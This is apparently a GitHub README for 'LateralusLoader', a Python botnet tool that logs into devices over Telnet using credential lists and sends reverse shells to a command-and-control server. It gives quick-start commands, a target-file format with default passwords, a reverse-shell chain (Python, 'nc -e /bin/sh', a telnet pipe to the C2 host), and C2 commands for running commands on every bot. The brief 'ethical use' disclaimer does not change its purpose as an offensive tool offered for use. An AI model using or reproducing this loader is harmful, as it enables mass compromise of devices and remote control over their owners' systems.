# LateralusLoader – Telnet Loader & C2

A single Python script that combines a **multi‑threaded Telnet credential loader** with a **fully interactive botnet C2 server**.  
The loader sweeps through `ip:user:pass` targets, authenticates over Telnet, and fires off reverse shells that try Python3, Python2, netcat, and telnet in order. The C2 server catches those shells and gives you real‑time control over every bot.

---

## Screenshots

**Help & usage screen**  
![Help Screen](https://i.ibb.co/TfvrnQk/image-14.webp)  
*Banner, usage examples, and available options.*

**Loader in action**  
![Loader running](https://i.ibb.co/7JmYKLK3/image-15.webp)  
*Loader sending credentials and payload to a target, then closing the connection.*

---

## What the Tool Looks Like

When you run the tool you’re greeted with the ASCII banner, identical to the one shown in the screenshots above. The help screen (`python3 main.py --help`) prints the banner followed by:

```
Usage:
  Loader mode:  python3 main.py loader <targets.txt> [--c2-ip IP] [--c2-port PORT]
  C2 mode:      python3 main.py c2 [PORT]
```

The loader console shows each step:

```
[*] Sleep's Loader deployed – sending reverse shells
[*] Target list: telnet.txt → C2 at 173.249.20.58:4444

[+][+] Sending Username 10.0.0.5
[+][+] Sending Password 10.0.0.5
[+][+] Payload sent 10.0.0.5
```

And the C2 server gives you an interactive prompt:

```
> list
Connected bots:
  1 -> 192.168.1.10
  2 -> 10.0.0.200

> broadcast uname -a
[Bot 1] Linux victim1 5.15.0-91-generic …
[Bot 2] Linux victim2 4.19.0-22-amd64 …
```

---

## Quick Start

```bash
git clone https://github.com/SleepTheGod/LateralusLoader.git
cd LateralusLoader

# Start the C2 listener (terminal 1)
python3 main.py c2 4444

# Launch the loader against your target list (terminal 2)
python3 main.py loader telnet_creds.txt --c2-ip <YOUR_IP> --c2-port 4444
```

---

## Target File Format

A plain text file. Lines starting with `#` are ignored.  
Each valid line must contain `ip:username:password`:

```
# IoT devices
192.168.1.100:admin:admin123
10.0.0.1:root:toor
172.16.0.5:user:letmein
```

---

## Payload Chain

The reverse shell command is a single line that tries four techniques sequentially:

1. **Python3** pseudo‑terminal reverse shell  
2. **Python2** fallback  
3. **Netcat** (`nc -e /bin/sh`)  
4. **Telnet** two‑stage pipe (`telnet IP PORT | /bin/sh | telnet IP PORT+1`)

The whole chain is backgrounded with `&` so the Telnet session can drop immediately.

---

## C2 Commands

| Command | Description |
|---------|-------------|
| `list` | Show all bots with their IPs |
| `broadcast <cmd>` | Run a command on every bot |
| `send <id> <cmd>` | Run a command on one bot |
| `help` | Display available commands |
| `exit` | Shut down the server and disconnect all bots |

---

## Notes & Disclaimers

- **Ethical Use Only** – This tool is meant for authorised penetration testing and research.  
- No external dependencies – runs on any system with Python 3.  
- All connections are plain Telnet (port 23); no SSH support.

---

## License

MIT – see `LICENSE` for full text.

---

## Author SleepTheGod

GitHub: [@SleepTheGod](https://github.com/SleepTheGod)  
Repo: [LateralusLoader](https://github.com/SleepTheGod/LateralusLoader)
```
